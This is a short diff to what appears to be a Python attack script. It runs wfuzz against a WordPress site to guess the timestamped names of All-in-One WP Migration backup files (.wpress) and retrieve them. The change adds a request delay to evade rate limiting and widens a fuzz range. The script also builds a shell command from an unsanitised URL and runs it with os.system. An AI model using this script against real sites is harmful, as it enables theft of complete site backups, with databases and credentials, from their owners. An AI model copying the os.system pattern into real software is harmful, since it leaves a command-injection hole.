@@ -91,7 +91,7 @@ try:
 			vercheck (url,headers)
 			print ("[*] Terminate WFuzz if you are not seeing 404 or 200 responses as this means error or rate limited. [*] ")
 			try:
-				command = ("wfuzz --oF /tmp/session --field r -c -z range,0-55 -z range,0-59 -z range,100-999 -X HEAD --sc 200,300,303 "+r.url+"wp-content/ai1wm-backups/"+domain+"-"+time_ymd+"-"+time_hms+"FUZZFUZ2Z-FUZ3Z.wpress")
+				command = ("wfuzz --oF /tmp/session -s 1 --field r -c -z range,0-59 -z range,0-59 -z range,100-999 -X HEAD --sc 200,300,303 "+r.url+"wp-content/ai1wm-backups/"+domain+"-"+time_ymd+"-"+time_hms+"FUZZFUZ2Z-FUZ3Z.wpress")
 				print ("[*] Wfuzz using the following command: "+command+" [*]")
 				os.system(command)
 			except KeyboardInterrupt:
